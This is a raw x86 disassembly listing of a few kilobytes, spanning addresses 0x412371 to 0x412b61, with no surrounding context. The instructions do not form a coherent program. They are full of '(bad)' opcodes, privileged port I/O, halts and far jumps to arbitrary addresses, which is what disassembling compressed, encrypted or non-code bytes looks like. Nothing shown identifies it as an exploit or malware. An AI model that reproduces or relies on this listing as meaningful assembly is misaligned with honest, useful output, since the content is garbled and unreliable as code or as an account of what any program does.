  412371:	lea    ecx,[edx]
  412373:	(bad)  
  412374:	shl    BYTE PTR [eax-0x5d],1
  412377:	enter  0x4bdf,0x80
  41237b:	cmc    
  41237c:	(bad)  
  41237d:	iret   
  41237e:	call   0x46fa4816
  412383:	pusha  
  412384:	and    al,0x96
  412386:	ds out dx,eax
  412388:	cld    
  412389:	mov    ebx,0x1c723ad4
  41238e:	neg    BYTE PTR [edi+0x77bf3aed]
  412394:	(bad)  
  412395:	hlt    
  412396:	aaa    
  412397:	jno    0x4123fa
  412399:	inc    edi
  41239a:	pusha  
  41239b:	(bad)
  41239e:	sbb    esi,edi
  4123a0:	pop    ds
  4123a1:	mov    BYTE PTR [ecx-0x38],0x95
  4123a5:	dec    eax
  4123a6:	int    0x0
  4123a8:	push   ecx
  4123a9:	stc    
  4123aa:	(bad)  
  4123ab:	clc    
  4123ac:	mov    bl,0x9e
  4123ae:	mov    esp,0xd5399e2a
  4123b3:	inc    ebx
  4123b4:	add    al,0xf6
  4123b6:	ds xchg edx,eax
  4123b8:	cmp    DWORD PTR ds:0x4a060e5e,ebp
  4123be:	(bad)  
  4123bf:	xor    BYTE PTR [ebx],al
  4123c1:	hlt    
  4123c2:	scas   al,BYTE PTR es:[edi]
  4123c3:	sahf   
  4123c4:	or     al,BYTE PTR [ebp+0x5d]
  4123c7:	inc    edi
  4123c8:	push   eax
  4123c9:	mov    al,ds:0x178f9453
  4123ce:	fs push eax
  4123d0:	xor    al,0xd9
  4123d2:	cmp    al,0xee
  4123d4:	adc    al,0xa6
  4123d6:	cmp    dl,BYTE PTR [esi+ebp*8-0x58]
  4123da:	or     al,0xcc
  4123dc:	ins    BYTE PTR es:[edi],dx
  4123dd:	push   ds
  4123de:	cmc    
  4123df:	pushf  
  4123e0:	push   ds
  4123e1:	sub    BYTE PTR [esi],cl
  4123e3:	out    0x74,al
  4123e5:	rcl    BYTE PTR [ebp-0x80],1
  4123e8:	data16 sar BYTE PTR [edx],cl
  4123eb:	pushf  
  4123ec:	mov    BYTE PTR [ecx],dh
  4123ee:	and    dh,bl
  4123f0:	sbb    al,BYTE PTR [eax-0x7fa88257]
  4123f6:	jb     0x41244a
  4123f8:	stc    
  4123f9:	add    bh,BYTE PTR [eax-0x23]
  4123fc:	imul   edx,DWORD PTR [ebx],0xcdef8960
  412402:	imul   ecx,DWORD PTR [ecx-0x2b],0xffffff83
  412406:	cmp    cl,al
  412408:	jo     0x4123b5
  41240a:	pop    esp
  41240b:	out    0x71,al
  41240d:	out    0x4e,eax
  41240f:	or     eax,0x5692f403
  412414:	cmp    DWORD PTR [edx-0x6b3c0203],ecx
  41241a:	ret    
  41241b:	mov    esi,0x1b8f7d08
  412420:	push   es
  412421:	mul    dh
  412423:	call   0x93efa79a
  412428:	adc    al,0x1c
  41242a:	jle    0x412459
  41242c:	rcl    DWORD PTR [ebx-0x38],cl
  41242f:	mov    dl,0x5
  412431:	mov    gs,WORD PTR [esp+edi*1-0x45f1e089]
  412438:	mov    bh,BYTE PTR [esi-0x78faa13e]
  41243e:	call   0xc26:0x2a31be97
  412445:	push   ss
  412446:	adc    ecx,DWORD PTR [esi*1+0x2f280ac6]
  41244d:	popa   
  41244e:	mov    edx,0x28ea8d4f
  412453:	and    DWORD PTR [edi],ebx
  412455:	jmp    0x5f849815
  41245a:	jmp    0x5c02:0x2d80f59
  412461:	fidiv  DWORD PTR [edx]
  412463:	xchg   esi,eax
  412464:	cmp    BYTE PTR [edi+0x531f92a7],dh
  41246a:	daa    
  41246b:	dec    ebx
  41246c:	in     eax,dx
  41246d:	stc    
  41246e:	fstp   QWORD PTR ds:0x259512b6
  412474:	sub    BYTE PTR [ecx],bl
  412476:	retf   0x3865
  412479:	hlt    
  41247a:	xor    DWORD PTR [ebp-0x5c80711a],0x36
  412481:	mov    dl,0xb4
  412483:	jno    0x41241c
  412485:	xchg   esp,eax
  412486:	sbb    al,bh
  412488:	lock push eax
  41248a:	mov    bh,0x42
  41248c:	fs pop edi
  41248e:	into   
  41248f:	(bad)  
  412490:	cmp    al,0x48
  412492:	push   es
  412493:	add    DWORD PTR [esi+0x15],0xcdde29e7
  41249a:	mov    edi,0x4b9d2a41
  41249f:	xchg   esi,eax
  4124a0:	cmp    BYTE PTR [edi-0x43],al
  4124a3:	ins    DWORD PTR es:[edi],dx
  4124a4:	test   eax,0x36ae8f51
  4124a9:	je     0x412470
  4124ab:	sar    ch,1
  4124ad:	imul   ebx,DWORD PTR [edi+ecx*2-0xd],0x3f4f8de6
  4124b5:	mov    edx,0x7cfdc7d9
  4124ba:	jg     0x41248d
  4124bc:	jl     0x41252b
  4124be:	mov    esi,0x5b38806
  4124c3:	jnp    0x412500
  4124c5:	mov    al,ds:0xf6029070
  4124ca:	int    0xe9
  4124cc:	mov    ah,BYTE PTR [ecx+ecx*1]
  4124cf:	int    0x2c
  4124d1:	sbb    BYTE PTR [eax-0x71],ch
  4124d4:	jg     0x41245b
  4124d6:	jo     0x41248b
  4124d8:	fsub   QWORD PTR [ebx]
  4124da:	dec    edi
  4124db:	jb     0x412472
  4124dd:	sub    BYTE PTR [ebp+ebx*2+0x46903248],bl
  4124e4:	ja     0x4124c9
  4124e6:	retf   
  4124e7:	outs   dx,BYTE PTR ds:[esi]
  4124e8:	jnp    0x412521
  4124ea:	add    BYTE PTR [edx],0x5a
  4124ed:	repnz ins DWORD PTR es:[edi],dx
  4124ef:	mov    esi,es
  4124f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124f2:	cmp    esp,DWORD PTR [edi+ebp*1]
  4124f5:	cmc    
  4124f6:	mov    al,BYTE PTR [esi+0x4e]
  4124f9:	or     BYTE PTR [eax+0x3d],bl
  4124fc:	icebp  
  4124fd:	dec    BYTE PTR [esi+ebp*4-0x2e]
  412501:	rcr    BYTE PTR [ebx],cl
  412503:	push   ecx
  412504:	iret   
  412505:	inc    edi
  412506:	loop   0x412516
  412508:	jno    0x412538
  41250a:	aam    0x7f
  41250c:	adc    DWORD PTR [edi-0x78],esp
  41250f:	std    
  412510:	add    dh,BYTE PTR [edi+0x48]
  412513:	or     esi,ecx
  412515:	xor    dh,BYTE PTR [edi-0x28]
  412518:	fsubr  QWORD PTR [eax+0x67]
  41251b:	loop   0x412526
  41251d:	mov    eax,0xcf7fc98b
  412522:	mov    DWORD PTR [ecx+0x53016e49],eax
  412528:	aam    0x50
  41252a:	adc    cl,ch
  41252c:	sbb    BYTE PTR [ebp+0x24c3d353],al
  412532:	mov    edi,0xc849e711
  412537:	call   0x5e52562e
  41253c:	cs jle 0x412597
  41253f:	or     al,0x20
  412541:	shr    DWORD PTR [ecx-0x80],cl
  412544:	retf   0x52cb
  412547:	je     0x412580
  412549:	fcomp  QWORD PTR [ebx-0xc]
  41254c:	into   
  41254d:	stos   BYTE PTR es:[edi],al
  41254e:	ins    BYTE PTR es:[edi],dx
  41254f:	cmp    dh,cl
  412551:	into   
  412552:	out    dx,eax
  412553:	addr16 out 0xb4,eax
  412556:	sbb    BYTE PTR [edx+edi*8],bh
  412559:	jle    0x41257e
  41255b:	repz cs retf 
  41255e:	ret    0x4f0d
  412561:	pop    ss
  412562:	dec    esp
  412563:	cmc    
  412564:	xchg   edx,eax
  412565:	sub    BYTE PTR [ebp+eax*2-0x3f],0x1a
  41256a:	out    0x3a,eax
  41256c:	jmp    0x84e119ea
  412571:	out    0x25,eax
  412573:	push   edi
  412574:	std    
  412575:	mov    esp,DWORD PTR [ecx+esi*8+0x34]
  412579:	sti    
  41257a:	mov    ecx,0x8d3bc07e
  41257f:	dec    edx
  412580:	sub    BYTE PTR [ecx+0x8],bl
  412583:	lahf   
  412584:	and    DWORD PTR [edx],edx
  412586:	jo     0x412573
  412588:	in     eax,dx
  412589:	cmp    ebp,esi
  41258b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41258c:	pop    eax
  41258d:	scas   al,BYTE PTR es:[edi]
  41258e:	je     0x4125f0
  412590:	sbb    ebp,eax
  412592:	out    0x94,al
  412594:	jo     0x41255b
  412596:	into   
  412597:	mov    edi,0x3a01962a
  41259c:	(bad)  
  41259d:	mov    dh,0x7d
  41259f:	js     0x4125a6
  4125a1:	cwde   
  4125a2:	inc    edx
  4125a3:	sub    ecx,DWORD PTR [eax+eiz*2]
  4125a6:	xor    ebp,ecx
  4125a8:	dec    ecx
  4125a9:	mov    ds:0xe1a88573,al
  4125ae:	idiv   BYTE PTR cs:[ebp+ebp*2-0x7]
  4125b3:	inc    edi
  4125b4:	mov    al,0xd7
  4125b6:	xor    cl,ah
  4125b8:	xchg   DWORD PTR [esi-0x4eda909e],edi
  4125be:	loopne 0x412609
  4125c0:	inc    edx
  4125c1:	pop    ss
  4125c2:	mov    ebx,ebx
  4125c4:	push   ss
  4125c5:	mov    ah,0x3d
  4125c7:	repnz inc esi
  4125c9:	loopne 0x41260c
  4125cb:	les    edx,FWORD PTR [eax+0x4f]
  4125ce:	in     eax,dx
  4125cf:	push   esp
  4125d0:	cld    
  4125d1:	cmp    bl,dh
  4125d3:	cmp    ecx,esi
  4125d5:	mov    ch,0xbd
  4125d7:	push   ebp
  4125d8:	xor    ebx,ecx
  4125da:	or     al,0x5d
  4125dc:	dec    ebx
  4125dd:	push   esi
  4125de:	ret    
  4125df:	xlat   BYTE PTR ds:[ebx]
  4125e0:	sbb    ch,bl
  4125e2:	mov    ch,0xb
  4125e4:	ret    0x42c
  4125e7:	pop    ebp
  4125e8:	add    ah,bl
  4125ea:	or     esp,DWORD PTR [edi]
  4125ec:	mov    ebp,0x216ca015
  4125f1:	jmp    0xbdfc3354
  4125f6:	es pop ss
  4125f8:	or     DWORD PTR [esi],ecx
  4125fa:	popf   
  4125fb:	and    dh,BYTE PTR [edx-0x12]
  4125fe:	scas   eax,DWORD PTR es:[edi]
  4125ff:	dec    ecx
  412600:	fdiv   DWORD PTR [ebp-0xe]
  412603:	pop    edx
  412604:	jns    0x4125fe
  412606:	mov    ds,WORD PTR [eax+edi*1+0x57]
  41260a:	retf   0xbc8c
  41260d:	stos   BYTE PTR es:[edi],al
  41260e:	ret    0x9611
  412611:	call   0x3788:0x881534bc
  412618:	pusha  
  412619:	mov    ah,0xd9
  41261b:	fisub  WORD PTR [ecx+edi*4+0x6b]
  41261f:	iret   
  412620:	jne    0x412692
  412622:	das    
  412623:	adc    eax,0x2dfd2157
  412628:	test   eax,0xda33833c
  41262d:	frstor [edx-0x1a]
  412630:	fadd   DWORD PTR [ebx-0x43]
  412633:	retf   
  412634:	adc    esi,DWORD PTR [eax]
  412636:	dec    esp
  412637:	mov    esi,0x62283978
  41263c:	fst    DWORD PTR [eax-0x1fc39731]
  412642:	scas   eax,DWORD PTR es:[edi]
  412643:	imul   eax,DWORD PTR [edi-0x74],0xffffffb7
  412647:	pop    ecx
  412648:	(bad)  
  412649:	mov    ah,0x98
  41264b:	daa    
  41264c:	outs   dx,DWORD PTR ds:[esi]
  41264d:	push   ecx
  41264e:	mov    al,ds:0xaa300398
  412653:	jne    0x4126b3
  412655:	pusha  
  412656:	test   al,0x2c
  412658:	(bad)  
  412659:	in     al,dx
  41265a:	js     0x41269d
  41265c:	repz add ch,BYTE PTR ds:0x7121e928
  412663:	cmp    DWORD PTR [esi+ebp*2],0x74
  412667:	popf   
  412668:	shl    edx,cl
  41266a:	push   eax
  41266b:	jp     0x41263a
  41266d:	sub    esi,esi
  41266f:	sub    ch,BYTE PTR [edi+0x5dcb9708]
  412675:	jbe    0x4126de
  412677:	hlt    
  412678:	jo     0x4126a2
  41267a:	or     eax,0x75612d92
  41267f:	adc    eax,0x3b903e73
  412684:	cmp    DWORD PTR [eax-0x2e],0xa662d34d
  41268b:	xor    BYTE PTR [esi],ah
  41268d:	mov    ah,0x13
  41268f:	sti    
  412690:	shr    DWORD PTR [eax+0x1b],cl
  412693:	pushf  
  412694:	out    dx,al
  412695:	mov    cl,0x48
  412697:	and    ch,ch
  412699:	mov    cl,cl
  41269b:	cdq    
  41269c:	retf   0xf351
  41269f:	pop    edi
  4126a0:	(bad)  [ebx]
  4126a2:	sar    edx,cl
  4126a4:	mov    al,0x2b
  4126a6:	push   ebp
  4126a7:	xchg   edx,eax
  4126a8:	hlt    
  4126a9:	inc    edi
  4126aa:	enter  0x27e0,0x69
  4126ae:	pop    edi
  4126af:	out    dx,eax
  4126b0:	(bad)  
  4126b2:	in     al,dx
  4126b3:	pop    ebx
  4126b4:	cmp    al,0x68
  4126b6:	jmp    0x11d:0x7f7be747
  4126bd:	das    
  4126be:	lods   al,BYTE PTR ds:[esi]
  4126bf:	nop
  4126c0:	fsub   DWORD PTR [ecx]
  4126c2:	sub    esp,DWORD PTR [edi]
  4126c4:	or     ecx,DWORD PTR ds:0x3c0c45f0
  4126ca:	pop    eax
  4126cb:	pop    edx
  4126cc:	mov    ebx,0x5e28ec10
  4126d1:	adc    BYTE PTR [ecx+eiz*1-0x27f69dfe],dl
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	xlat   BYTE PTR ds:[ebx]
  4126da:	sti    
  4126db:	mov    DWORD PTR ds:0xbc03c218,edx
  4126e1:	inc    ebx
  4126e2:	aad    0x2
  4126e4:	call   0x251c8142
  4126e9:	ins    BYTE PTR es:[edi],dx
  4126ea:	adc    DWORD PTR [edx+0x22],0x54eea1a7
  4126f1:	ins    BYTE PTR es:[edi],dx
  4126f2:	test   BYTE PTR [ebx],ch
  4126f4:	fisubr WORD PTR [edi-0x6d]
  4126f7:	mov    esi,0x42b3c816
  4126fc:	mov    DWORD PTR [eax+0x7b],edx
  4126ff:	jb     0x41276b
  412701:	and    DWORD PTR ds:0x7041a071,edi
  412707:	or     al,0xbc
  412709:	mov    ds:0x1c8d555,al
  41270e:	inc    ebp
  41270f:	gs cs sti 
  412712:	add    bl,BYTE PTR [esi+edi*4-0x45332e14]
  412719:	jmp    0xef04:0x590bdb12
  412720:	adc    ah,BYTE PTR [ebx+0xc]
  412723:	popf   
  412724:	fsub   QWORD PTR [ecx]
  412726:	xor    ch,BYTE PTR [ebp+0x2f5db8c5]
  41272c:	jnp    0x412704
  41272e:	mov    ch,BYTE PTR [edi-0x42e8cec3]
  412734:	push   ebp
  412735:	nop
  412736:	iret   
  412737:	repnz adc BYTE PTR [eax],0x1b
  41273b:	add    DWORD PTR [eax-0x7dbe3e13],ebp
  412741:	cdq    
  412742:	pop    ss
  412743:	jg     0x4126d9
  412745:	hlt    
  412746:	sub    edi,DWORD PTR [edi]
  412748:	xor    DWORD PTR [edi+ebp*2-0x23],ebx
  41274c:	ins    BYTE PTR es:[edi],dx
  41274d:	xchg   ebx,eax
  41274e:	adc    BYTE PTR [edi],al
  412750:	dec    eax
  412751:	test   DWORD PTR [ebp+0x34],esi
  412754:	jo     0x412724
  412756:	mov    cl,0xb3
  412758:	data16 mov ch,0x65
  41275b:	call   0x701c:0xed54dd05
  412762:	gs push ecx
  412764:	xchg   edx,eax
  412765:	jno    0x412760
  412767:	test   BYTE PTR [esi+0x5486cd12],dh
  41276d:	call   0x51c3:0xc7eb8e21
  412774:	sub    cl,al
  412776:	loope  0x412763
  412778:	fisub  DWORD PTR [edi]
  41277a:	int    0x6e
  41277c:	push   ecx
  41277d:	rcr    BYTE PTR [edx],cl
  41277f:	pop    esi
  412780:	and    DWORD PTR [edi-0x27],edx
  412783:	dec    ebp
  412784:	inc    edx
  412785:	dec    esi
  412786:	adc    BYTE PTR [ebp+0x43c0965],al
  41278c:	pop    ebp
  41278d:	or     DWORD PTR [ebx+0x5895ef0d],esi
  412793:	pusha  
  412794:	lds    eax,FWORD PTR [ecx+0xf]
  412797:	mov    WORD PTR [esi-0x3d],ss
  41279a:	dec    eax
  41279b:	mov    ds:0x3d14a08,al
  4127a0:	pop    eax
  4127a1:	aad    0x73
  4127a3:	pop    esp
  4127a4:	mov    ah,0xc8
  4127a6:	or     DWORD PTR [ebp-0x14],edi
  4127a9:	in     al,0x9e
  4127ab:	jg     0x412794
  4127ad:	mov    ah,0x83
  4127af:	ror    BYTE PTR [ebx+0x74],cl
  4127b2:	loope  0x41277f
  4127b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127b5:	dec    edi
  4127b6:	inc    esp
  4127b7:	add    BYTE PTR [ebp+0x3f],bl
  4127ba:	dec    ecx
  4127bb:	int3   
  4127bc:	xor    edi,DWORD PTR [edx]
  4127be:	loop   0x4127b2
  4127c0:	sub    esp,DWORD PTR [edi-0x68]
  4127c3:	call   0x3bfe:0x2a6c0953
  4127ca:	popf   
  4127cb:	push   eax
  4127cc:	xor    eax,0x73d4ba9f
  4127d1:	xchg   dh,dl
  4127d3:	jle    0x412760
  4127d5:	ret    0x73a8
  4127d8:	addr16 dec esp
  4127da:	out    dx,eax
  4127db:	jl     0x4127da
  4127dd:	stos   BYTE PTR es:[edi],al
  4127de:	outs   dx,DWORD PTR ds:[esi]
  4127df:	or     ebp,edi
  4127e1:	pop    ebp
  4127e2:	mov    edi,0xc3d53594
  4127e7:	jae    0x4127fd
  4127e9:	bnd jne 0x412861
  4127ec:	int3   
  4127ed:	pushf  
  4127ee:	push   0x38418925
  4127f3:	stos   BYTE PTR es:[edi],al
  4127f4:	add    bh,BYTE PTR [eax+0x7a]
  4127f7:	cmp    DWORD PTR [esi],ecx
  4127f9:	mov    ebp,0xb696874b
  4127fe:	xchg   bl,bl
  412800:	jmp    0x1eee48f1
  412805:	call   0x4e3bc966
  41280a:	xor    eax,0xd5599fed
  41280f:	sbb    al,dh
  412811:	or     BYTE PTR [ecx],bl
  412813:	hlt    
  412814:	add    BYTE PTR [edx+0xd],bh
  412817:	jp     0x412856
  412819:	ret    0xe6a6
  41281c:	sbb    DWORD PTR [esi],0xc489309f
  412822:	jle    0x4127f6
  412824:	cmp    DWORD PTR [edx],ecx
  412826:	jmp    0xedb1:0x97b4f688
  41282d:	dec    esp
  41282e:	adc    al,0xbf
  412830:	iret   
  412831:	je     0x4127b6
  412833:	adc    edi,DWORD PTR [ecx+0x3db0da8c]
  412839:	adc    DWORD PTR [ebx-0x1759ec0e],edx
  41283f:	adc    BYTE PTR [eax-0x54d8f41d],bl
  412845:	gs push edi
  412847:	push   cs
  412848:	mov    al,ds:0xd4d8c379
  41284d:	push   ebp
  41284e:	rcl    BYTE PTR [ebp-0x21e15dcc],0x35
  412855:	push   edi
  412856:	nop
  412857:	push   cs
  412858:	sub    al,0xf0
  41285a:	test   eax,0x2ff314d2
  41285f:	ss in  eax,0x75
  412862:	or     eax,0x2428ae8f
  412867:	jae    0x41285e
  412869:	add    BYTE PTR [edi-0x6be1ed84],bl
  41286f:	adc    eax,0xc3459872
  412874:	xchg   esi,eax
  412875:	adc    BYTE PTR [ecx],bh
  412877:	dec    ecx
  412878:	sbb    bl,ah
  41287a:	mov    cl,0x31
  41287c:	push   esp
  41287d:	lds    ecx,FWORD PTR [ebp+0x2cb940dc]
  412883:	je     0x412867
  412885:	aas    
  412886:	and    ebp,esp
  412888:	bound  esi,QWORD PTR [esi]
  41288a:	sbb    BYTE PTR gs:[edi-0x1c978c44],bl
  412891:	dec    dl
  412893:	data16 mov WORD PTR [ebx],?
  412896:	cmp    ch,BYTE PTR [esi+0x647dd91a]
  41289c:	and    eax,0x37f8f6ba
  4128a1:	dec    ebx
  4128a2:	test   al,0xca
  4128a4:	jp     0x412876
  4128a6:	imul   edi,DWORD PTR [esp+eax*1+0x6b],0xbe5268b7
  4128ae:	and    bl,BYTE PTR [eax+0x4ad6592d]
  4128b4:	jl     0x41292d
  4128b6:	or     BYTE PTR [ebx-0x6a],0xd2
  4128ba:	out    0x6a,al
  4128bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128bd:	ds mov ah,0x4d
  4128c0:	mov    edx,0x19a81cc9
  4128c5:	jmp    0xfa9d:0x4757eb6a
  4128cc:	xchg   esp,eax
  4128cd:	fwait
  4128ce:	repnz pop ebx
  4128d0:	sbb    eax,0xca22d08a
  4128d5:	xchg   ebp,eax
  4128d6:	mov    ebp,0xb48eec98
  4128db:	sar    bl,cl
  4128dd:	push   ds
  4128de:	xor    eax,0x487b86f3
  4128e3:	retf   
  4128e4:	and    cl,dh
  4128e6:	jl     0x412946
  4128e8:	(bad)  
  4128e9:	mov    al,ds:0x15d86a4a
  4128ee:	adc    edx,DWORD PTR [edx-0x48ccecb1]
  4128f4:	pop    ecx
  4128f5:	ss cs jp 0x412920
  4128f9:	stos   BYTE PTR es:[edi],al
  4128fa:	or     bh,BYTE PTR [edx-0x3c]
  4128fd:	mov    DWORD PTR [ebx],edi
  4128ff:	test   al,0x6a
  412901:	mov    eax,esi
  412903:	shl    BYTE PTR [ecx+0x2a],0x4
  412907:	sbb    dl,ah
  412909:	xchg   edi,eax
  41290a:	daa    
  41290b:	dec    ebp
  41290c:	xchg   esp,eax
  41290d:	pop    ecx
  41290e:	ins    BYTE PTR es:[edi],dx
  41290f:	cdq    
  412910:	out    dx,eax
  412911:	mov    WORD PTR [esi-0x29],ds
  412914:	mov    al,BYTE PTR [ecx+0x6fed768d]
  41291a:	mov    BYTE PTR fs:[edi],0xb5
  41291e:	sbb    DWORD PTR [edx+0x78],0xadc991af
  412925:	test   eax,0x90b55d37
  41292a:	out    0x3b,al
  41292c:	and    al,al
  41292e:	jne    0x4128e8
  412930:	in     al,0x9
  412932:	ds and eax,0xc1a1dd28
  412938:	mov    WORD PTR [ecx-0x61001b3c],fs
  41293e:	xchg   DWORD PTR [esi+eax*2+0x7f],ecx
  412942:	xor    ch,dh
  412944:	xor    DWORD PTR [esi+0x4927f266],eax
  41294a:	mov    eax,0xe49a5e01
  41294f:	bound  ebx,QWORD PTR [ecx]
  412951:	imul   esp,DWORD PTR [ebx+0x61dde7fe],0x3c081f45
  41295b:	sbb    al,0x39
  41295d:	(bad)  ds:[edi-0x3d]
  412961:	ja     0x4129a7
  412963:	push   0xffffffdd
  412965:	dec    ebp
  412966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412967:	nop
  412968:	cdq    
  412969:	and    ah,BYTE PTR [ecx+0x24]
  41296c:	or     eax,0x3f11b950
  412971:	scas   al,BYTE PTR es:[edi]
  412972:	lods   al,BYTE PTR ds:[esi]
  412973:	hlt    
  412974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412975:	dec    edx
  412976:	(bad)  
  412977:	(bad)  
  412978:	mov    ebx,0x332abe24
  41297d:	call   DWORD PTR [ecx]
  41297f:	hlt    
  412980:	jg     0x412918
  412982:	mov    bl,0xaf
  412984:	xor    esi,eax
  412986:	call   0x804e:0x718ffc87
  41298d:	sub    dl,al
  41298f:	sti    
  412990:	push   edi
  412991:	jns    0x41297a
  412993:	test   al,0x94
  412995:	jecxz  0x4129d1
  412997:	pop    ebx
  412998:	dec    ebp
  412999:	adc    dl,BYTE PTR [eax]
  41299b:	and    eax,0xdd25b665
  4129a0:	pop    esi
  4129a1:	fnstsw WORD PTR [edi]
  4129a3:	mov    dl,0x48
  4129a5:	add    DWORD PTR [eax+0x2f0ad029],esi
  4129ab:	stos   BYTE PTR es:[edi],al
  4129ac:	xchg   ebx,ecx
  4129ae:	(bad)  
  4129af:	sbb    bl,BYTE PTR [eax-0x10]
  4129b2:	cmp    al,0x6d
  4129b4:	push   edx
  4129b5:	clc    
  4129b6:	push   edi
  4129b7:	xor    eax,0xfea695e7
  4129bc:	data16 mov cl,0xf1
  4129bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129c0:	xchg   bl,cl
  4129c2:	and    esi,DWORD PTR [ecx]
  4129c4:	pop    edx
  4129c5:	pop    ss
  4129c6:	jne    0x412992
  4129c8:	add    al,0xc8
  4129ca:	jnp    0x4129a0
  4129cc:	mov    ecx,0xab568e40
  4129d1:	mov    al,0xff
  4129d3:	dec    ebp
  4129d4:	lock xchg ecx,eax
  4129d6:	mov    BYTE PTR [edx],0x48
  4129d9:	arpl   di,ax
  4129db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129dc:	push   edi
  4129dd:	xor    bl,bh
  4129df:	loopne 0x412973
  4129e1:	pop    ebx
  4129e2:	xor    BYTE PTR [ecx+0x7967dc6],bl
  4129e8:	sbb    eax,0xa20b1578
  4129ed:	in     al,dx
  4129ee:	(bad)  
  4129ef:	js     0x4129c8
  4129f1:	cwde   
  4129f2:	lahf   
  4129f3:	mov    esp,DWORD PTR [edi+0x5f]
  4129f6:	sbb    BYTE PTR [edi-0x28],ah
  4129f9:	dec    edi
  4129fa:	out    dx,al
  4129fb:	adc    eax,0x8b5b4ba3
  412a00:	mov    ah,0x4e
  412a02:	lods   eax,DWORD PTR ds:[esi]
  412a03:	mov    dl,0xc5
  412a05:	and    esi,DWORD PTR [eax-0x42]
  412a08:	mov    esi,0x1b7f1057
  412a0d:	ret    0xfab2
  412a10:	int    0x1e
  412a12:	jmp    0x7f5e:0x8f930141
  412a19:	xor    al,0x35
  412a1b:	lea    ebx,ds:0x6d55d9b4
  412a21:	(bad)  
  412a22:	lahf   
  412a23:	xchg   DWORD PTR [ecx+0x68],eax
  412a26:	mov    esi,DWORD PTR ds:0xa5b4974d
  412a2c:	sub    eax,0xa1e43519
  412a31:	push   eax
  412a32:	mov    esi,0xf76918b4
  412a37:	push   0x61
  412a39:	push   edi
  412a3a:	jae    0x412ab8
  412a3c:	add    eax,0xb21096b
  412a41:	jle    0x412aa2
  412a43:	sahf   
  412a44:	je     0x412aaf
  412a46:	cmc    
  412a47:	mov    DWORD PTR [edi+eax*2-0x455f07aa],eax
  412a4e:	sub    ch,BYTE PTR [edi+0x66]
  412a51:	stos   DWORD PTR es:[edi],eax
  412a52:	(bad)  
  412a54:	fidivr DWORD PTR [eax+edx*2]
  412a57:	in     al,0x83
  412a59:	call   0x827ee173
  412a5e:	in     eax,0xe8
  412a60:	or     ebx,edi
  412a62:	jle    0x412a27
  412a64:	jp     0x412abf
  412a66:	and    bl,BYTE PTR [esi]
  412a68:	push   es
  412a69:	pop    edi
  412a6a:	dec    eax
  412a6b:	mov    ch,0x77
  412a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a6e:	fisttp WORD PTR [eax]
  412a70:	push   ebx
  412a71:	and    eax,0xa392adf6
  412a76:	clc    
  412a77:	xor    DWORD PTR [edx+0x63],edi
  412a7a:	cmp    ebx,DWORD PTR [ecx]
  412a7c:	push   edi
  412a7e:	mov    ds:0x508f6c95,eax
  412a83:	sbb    ebp,esi
  412a85:	(bad)
  412a88:	push   esi
  412a89:	and    dl,ch
  412a8b:	popf   
  412a8c:	jecxz  0x412a43
  412a8e:	jns    0x412a21
  412a90:	mov    dh,0x89
  412a92:	fcmovb st,st(6)
  412a94:	push   ebp
  412a95:	(bad)  
  412a96:	mov    eax,ds:0x7ee2e25d
  412a9b:	sub    BYTE PTR [edx+0x41a024bf],cl
  412aa1:	test   ah,0x2b
  412aa4:	pop    ebp
  412aa5:	pushf  
  412aa6:	int3   
  412aa7:	mov    ds:0x15f9355e,eax
  412aac:	pop    ebx
  412aad:	ss jmp 0x41cd:0x607503e4
  412ab5:	aad    0xea
  412ab7:	sub    DWORD PTR [edx+0x350159ef],esp
  412abd:	mov    bh,0x6a
  412abf:	sub    al,0xda
  412ac1:	ret    
  412ac2:	dec    edx
  412ac3:	add    eax,0x6096c1fd
  412ac8:	mov    ebp,esi
  412aca:	jecxz  0x412b3f
  412acc:	data16 fst DWORD PTR [esi+0xe]
  412ad0:	into   
  412ad1:	mov    eax,0xce1635b7
  412ad6:	idiv   esi
  412ad8:	(bad)  
  412ad9:	mov    edx,0x7f490913
  412ade:	pop    ebp
  412adf:	pop    eax
  412ae0:	cli    
  412ae1:	in     eax,0x79
  412ae3:	push   ecx
  412ae4:	test   BYTE PTR [ebx-0x226f073c],cl
  412aea:	dec    ecx
  412aeb:	sbb    eax,0x46e6b2c5
  412af0:	das    
  412af1:	inc    esi
  412af2:	inc    edx
  412af3:	inc    eax
  412af4:	sbb    esp,esp
  412af6:	pop    ss
  412af7:	dec    esi
  412af8:	xchg   esp,eax
  412af9:	add    DWORD PTR ds:0xfcc1ba6d,edx
  412aff:	lods   al,BYTE PTR ds:[esi]
  412b00:	pop    ebx
  412b01:	jge    0x412b1b
  412b03:	inc    edx
  412b04:	lods   eax,DWORD PTR ds:[si]
  412b06:	mov    ah,cl
  412b08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b09:	jae    0x412b4e
  412b0b:	out    0x8b,al
  412b0d:	pop    esi
  412b0e:	or     al,BYTE PTR es:[edi+0x3c8f545d]
  412b15:	sbb    eax,0xa9213bd8
  412b1a:	in     eax,dx
  412b1b:	shl    DWORD PTR ds:0x8c12aa55,1
  412b21:	jmp    0x9925:0xea962aa4
  412b28:	and    edi,esp
  412b2a:	pop    esi
  412b2b:	xor    BYTE PTR [ebx],dh
  412b2d:	push   ss
  412b2e:	sub    DWORD PTR ds:0xea19530a,ebx
  412b34:	mov    eax,ds:0xc14d6640
  412b39:	xchg   bl,dh
  412b3b:	adc    DWORD PTR [ebx],0xffffff98
  412b3e:	mov    al,0x1c
  412b40:	aam    0x7a
  412b42:	fcmovne st,st(0)
  412b44:	jp     0x412b61
  412b46:	jmp    0x412b36
  412b48:	popf   
  412b49:	(bad)  
  412b4a:	pusha  
  412b4b:	std    
  412b4c:	imul   esi,DWORD PTR [edi+0x12940a0f],0x7d
  412b53:	dec    esi
  412b54:	in     eax,dx
  412b55:	loop   0x412ada
  412b57:	fisubr DWORD PTR [ecx]
  412b59:	fcom   QWORD PTR [ecx]
  412b5b:	cmp    bh,0xc2
  412b5e:	shl    dh,1
  412b60:	xchg   edx,eax
  412b61:	(bad)  
